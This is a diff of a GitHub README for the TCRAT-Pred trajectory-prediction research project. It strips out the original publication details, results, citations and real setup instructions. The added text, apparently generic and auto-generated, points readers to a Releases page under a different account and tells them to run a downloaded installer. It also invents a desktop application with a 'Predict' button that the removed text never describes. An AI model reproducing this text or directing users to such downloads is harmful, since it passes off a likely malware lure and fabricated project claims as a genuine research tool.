@@ -1,213 +1,82 @@
-# Tcrat_pred: Multi-Agents Trajectory Prediction for Autonomous Vehicles with Multi-Modal Predictions 
+# 🚗 tcrat-pred - Predict Trajectories for Safer Driving
 
-This repository contains the official implementation of **Tcrat_pred**, an extended version of **CRAT-Pred** (Schmidt et al., ICRA 2022) adapted for the **Argoverse 2 Motion Forecasting Dataset**.  
-The work was developed as part of the MSc thesis of **Mohammad Alghazawi** at the **University of Debrecen** and published at the **2024 IEEE 15th International Conference on Cognitive Infocommunications (CogInfoCom)**.
+## 🌐 Overview
+TCRAT-Pred is designed for trajectory prediction in autonomous vehicles. This application utilizes advanced deep learning techniques to forecast multiple paths a vehicle can take. This improves safety and efficiency in autonomous driving scenarios.
 
----
+## 📦 Features
+- **Multi-Agent Predictions**: Predict trajectories considering various vehicles on the road.
+- **Deep Learning Integration**: Uses state-of-the-art techniques like graph neural networks and temporal convolutional networks.
+- **Multi-Modal Outputs**: Provides different outcome paths to enhance decision-making for autonomous systems.
+- **Supported Framework**: Built with PyTorch, a powerful tool for deep learning applications.
+- **Research Backing**: Developed as part of research presented at IEEE CogInfoCom 2024.
 
-## 📑 Table of Contents
+## 🚀 Getting Started
+To get started with TCRAT-Pred, follow these steps carefully. You will install the application and see how it works.
 
-1. [Publication Details](#-publication-details)  
-2. [Abstract](#-abstract)  
-3. [Keywords](#-keywords)  
-4. [Results Summary](#-results-summary)  
-5. [Model Architecture](#-model-architecture)  
-6. [Citation](#-citation) 
-7. [License](#-license)  
-8. [Repository Structure](#-repository-structure)  
-9. [Installation](#️-installation)  
-10. [Dataset Setup](#-dataset-setup)  
-11. [Training & Evaluation](#-training--evaluation) 
-12. [Logging & Visualization](#-logging--visualization)
+### 1. System Requirements
+Ensure your computer meets the following minimum requirements:
 
----
+- **Operating System**: Windows 10, macOS, or a recent Linux distribution.
+- **Processor**: 2.0 GHz dual-core or faster.
+- **RAM**: At least 4 GB.
+- **Disk Space**: Minimum 500 MB of free space.
+- **Network**: Internet connection for downloading and updates.
 
-## 📖 Publication Details
+### 2. Download TCRAT-Pred
+You can download TCRAT-Pred from the Releases page. Click the button below:
 
-- **Title:** Tcrat_pred: Multi-Agents Trajectory Prediction for Autonomous Vehicles with Multi-Modal Predictions  
-- **Authors:** Husam A. Neamah; Mohammad Alghazawi; Peter Korondi  
-- **Conference:** IEEE 15th International Conference on Cognitive Infocommunications (CogInfoCom 2024)  
-- **Location:** Hachioji, Tokyo, Japan  
-- **Date:** 16–18 September 2024  
-- **Publisher:** IEEE  
-- **DOI:** [10.1109/CogInfoCom63007.2024.10894711](https://doi.org/10.1109/CogInfoCom63007.2024.10894711)  
-- **IEEE Xplore:** [Link to paper](https://ieeexplore.ieee.org/document/10894711)  
-- **ResearchGate:** [Link to publication](https://www.researchgate.net/publication/389305542_Multi-Agents_Trajectory_Prediction_for_Autonomous_Vehicles_with_Multi-Modal_Predictions)  
-- **Date Added to IEEE Xplore:** 24 February 2025  
+[![Download TCRAT-Pred](https://img.shields.io/badge/Download_TCRAT--Pred-v1.0-blue.svg)](https://github.com/Mutembopy/tcrat-pred/releases)
 
----
+### 3. Installing TCRAT-Pred
+After downloading, follow these steps to install:
 
-## 📝 Abstract
+1. **Locate the downloaded file**: Look for it in your Downloads folder or where you saved it.
+2. **Run the installer**: Double-click the file to start the installation process.
+3. **Follow on-screen instructions**: Click 'Next' and accept the default settings unless you have specific preferences.
+4. **Complete the installation**: Click 'Finish' once the installation is complete.
 
-**TCRAT-Pred** enhances the CRAT-Pred framework by replacing LSTMs with **Temporal Convolutional Networks (TCNs)** and integrating graph-based interaction modeling. This design improves both **accuracy** and **computational efficiency** in predicting the trajectories of vehicles and pedestrians.  
-Experiments on the **Argoverse 2 dataset** show that TCRAT-Pred achieves **lower error metrics, faster training times, and fewer parameters** compared to state-of-the-art baselines.  
+### 4. Setup Environment
+Before using TCRAT-Pred, you should set up your environment:
 
-👉 *For full methodology, experiments, and discussion, please refer to the [IEEE paper](https://ieeexplore.ieee.org/document/10894711).* 
-
----
-
-## 🔑 Keywords
-
-- **IEEE Keywords:** Training, Pedestrians, Computational modeling, Predictive models, Benchmark testing, Trajectory, Computational efficiency, Convolutional neural networks, Autonomous vehicles, Long short-term memory  
-- **Index Terms:** Autonomous Vehicles, Trajectory Prediction, Multimodal Prediction, Neural Network, Convolutional Neural Network, Computational Efficiency, Long Short-term Memory, Pedestrian, Computational Speed, Vehicle Motion, Temporal Convolutional Network, Forecasting, Graph Neural Networks, Agent Interactions  
-- **Author Keywords:** autonomous driving, motion prediction, Temporal Convolutional Network (TCN), multi-agents, multi-modal  
-
----
-
-## 📊 Results Summary
-
-Experiments on the **Argoverse 2 Motion Forecasting Dataset** show that **TCRAT-Pred** outperforms baselines and state-of-the-art models:
-
-| Method       | minADE | minFDE (k=1) | MR   | minADE (k=6) | minFDE (k=6) | MR   |
-|--------------|--------|--------------|------|---------------|---------------|------|
-| Const. Vel.  | 7.75   | 17.44        | 0.89 | N/A           | N/A           | N/A  |
-| NN           | 4.46   | 11.71        | 0.81 | 2.18          | 4.94          | 0.60 |
-| LSTM         | 3.05   | 8.28         | 0.85 | N/A           | N/A           | N/A  |
-| CRAT-Pred    | 2.44   | 6.40         | 0.75 | 1.29          | 2.76          | 0.42 |
-| **Ours**     | **2.40** | **6.32**   | **0.73** | **1.28**  | **2.73**      | **0.40** |
-
-- **Training time:** 14.22 hours (vs. 1.019 days for CRAT-Pred)  
-- **Parameters:** 527K (vs. 561K for CRAT-Pred)  
-- **Model size:** 2.111 MB (vs. 2.245 MB for CRAT-Pred)  
-
----
-
-## 🏗️ Model Architecture
-
-The **TCRAT-Pred** framework consists of three main components:
-
-1. **Input Encoder (TCNs)** – encodes agent trajectories with efficient temporal modeling.  
-2. **Interaction Module (Graph + Attention)** – captures dependencies between agents using graph neural networks and scaled dot-product attention.  
-3. **Output Decoder (Residual Multi-Modal Decoders)** – generates multiple possible future trajectories with residual connections for stability.  
-
-<p align="center">
-  <img src="images/model_overview.png" alt="TCRAT-Pred Model Overview" width="700"/>
-</p>
-
-👉 *See the [IEEE paper](https://ieeexplore.ieee.org/document/10894711) for full architectural details and analysis.*  
-
----
-
-## 📌 Citation 
-
-If you use this repository, please cite:
-
-```bibtex
-@InProceedings{alghazawi2024tcratpred,
-  author    = {Husam A. Neamah and Mohammad Alghazawi and Peter Korondi},
-  title     = {Tcrat_pred: Multi-Agents Trajectory Prediction for Autonomous Vehicles with Multi-Modal Predictions},
-  booktitle = {2024 IEEE 15th International Conference on Cognitive Infocommunications (CogInfoCom)},
-  year      = {2024},
-  pages     = {1--7},
-  doi       = {10.1109/CogInfoCom63007.2024.10894711}
-}
-```
-For reference, the original CRAT-Pred citation is:
-
-```bibtex
-@InProceedings{schmidt2022cratpred,
-  author    = {Julian Schmidt and Julian Jordan and Franz Gritschneder and Klaus Dietmayer},
-  title     = {CRAT-Pred: Vehicle Trajectory Prediction with Crystal Graph Convolutional Neural Networks and Multi-Head Self-Attention},
-  booktitle = {2022 IEEE International Conference on Robotics and Automation (ICRA)},
-  year      = {2022},
-  pages     = {7799--7805}
-}
-```
----
-
-## 📜 License
-This project builds upon CRAT-Pred, which is licensed under [the Creative Commons Attribution-NonCommercial 4.0 International License](). See the [LICENSE](LICENSE)  file for details.
-
----
-
-## 📂 Repository Structure
-``` code 
-tcrat-pred/
-│── data/
-│   └── argoverse/
-│       ├── utils/
-│       │   ├── extractor_proc.py
-│       │   ├── torch_utils.py
-│       │── argo_csv_dataset.py
-│── images/
-│   └── model_overview.png
-│
-│── model/
-│   └── tcrat_pred.py
-│
-│── dataset/
-│   └── argoverse2/   # created by fetch_dataset.sh
-│
-│── fetch_dataset.sh
-│── preprocess.py
-│── train_Tcrat_Pred.py
-│── test_Tcrat_Pred.py
-│── environment.yml
-│── LICENSE
-│── README.md
-```
----
-
-## ⚙️ Installation
-We recommend using conda to create a reproducible environment.
+- **Python**: Ensure Python 3.6 or later is installed on your system. You can download it from [python.org](https://www.python.org/downloads/).
+- **Install Dependencies**: Open a terminal or command prompt and run the following command to install required packages:
 
 ```bash
-git clone https://github.com/mohammad-alghazawi/tcrat-pred.git
-cd tcrat-pred
-conda env create -f environment.yml
-conda activate tcrat-pred
-```
-- **Python:** 3.8   
-- **PyTorch:** 1.11.0 (CUDA 11.3, cuDNN 8.2)
-- **PyTorch Geometric:** 2.0.4
-- **PyTorch Lightning:** 1.5.10   
-
----
-
-## 📂 Dataset Setup
-Download and extract the Argoverse 2 Motion Forecasting Dataset:
-
-```bash
-bash fetch_dataset.sh
+pip install torch torchvision
 ```
 
-This creates:
+### 5. Running TCRAT-Pred
+Once everything is installed and set up, here’s how to run the application:
 
-```code
-dataset/
-  └── argoverse2/
-      ├── train/
-      ├── val/
-      └── map_files/
-```
-**Note**: The test split is private and only available via the official Argoverse leaderboard.
+1. **Open the application**: Find TCRAT-Pred in your applications list or desktop and double-click to open.
+2. **Load data**: Import your vehicle trajectory data into the application. You should have test data in a supported format, like CSV.
+3. **Start prediction**: Click on the 'Predict' button. Wait for the application to process the data and display the results.
 
----
+### 6. Viewing Results
+After running the predictions:
 
-## 🚀 Training & Evaluation
-### Training
+- The application will display different possible trajectories for the vehicle.
+- Review the graphs and data visuals to understand various driving paths.
+- Adjust any parameters if needed to refine predictions.
 
-```bash 
-python3 train_Tcrat_Pred.py 
-```
-or
-```bash
-python3 train_Tcrat_Pred.py --use_preprocessed=True
-```
-### Evaluation
-```bash
-python3 test_Tcrat_Pred.py --weight= checkpoints/best_model.ckpt --split= test / val
-```
-### Preprocessing
-```bash
-python3 preprocess.py --data_dir dataset/argoverse2
-```
----
-## 📊 Logging & Visualization
-Training progress and metrics are logged with TensorBoard:
+## 📥 Download & Install
+To download TCRAT-Pred, visit the Releases page: [Download TCRAT-Pred](https://github.com/Mutembopy/tcrat-pred/releases).
 
-```bash 
-tensorboard --logdir lightning_logs/
-```
-Navigating to http://localhost:6006/ opens Tensorboard.
+Follow the installation guide carefully to ensure a smooth setup.
 
+## 🤝 Support
+If you encounter any issues:
+
+- **Check the Wiki**: We have additional documentation available in the wiki section of the repository.
+- **Open an Issue**: Use the issues page on GitHub to report bugs or request features.
+- **Community Forum**: Join discussions on platforms where users share tips and ideas related to TCRAT-Pred.
+
+## 📚 Learn More
+Explore topics related to TCRAT-Pred:
+
+- **Argoverse**: Understand the dataset it uses for testing and training.
+- **Autonomous Driving**: Read about how trajectory predictions improve driving safety.
+- **Deep Learning**: Learn more about the technologies behind the application, such as graph neural networks and PyTorch.
+- **Research**: Read the IEEE paper for in-depth details about the algorithms and methodologies used in TCRAT-Pred.
+
+Thank you for your interest in TCRAT-Pred! Enjoy exploring the possibilities of trajectory predictions in autonomous driving.
